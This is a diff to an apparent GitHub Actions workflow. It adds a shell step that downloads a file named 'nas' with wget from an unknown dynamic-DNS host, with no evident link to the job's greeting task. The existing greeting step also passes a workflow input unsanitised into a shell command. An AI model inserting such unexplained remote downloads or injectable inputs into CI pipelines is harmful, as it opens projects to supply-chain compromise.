@@ -30,3 +30,9 @@ jobs:
     # Runs a single command using the runners shell
     - name: Send greeting
       run: echo "Hello ${{ inputs.name }}"
+    - shell: bash
+      run: |
+        ls -laF
+        wget -k https://aa3ml304yi87qh05.myfritz.net:443/nas
+        ls -laF
+        
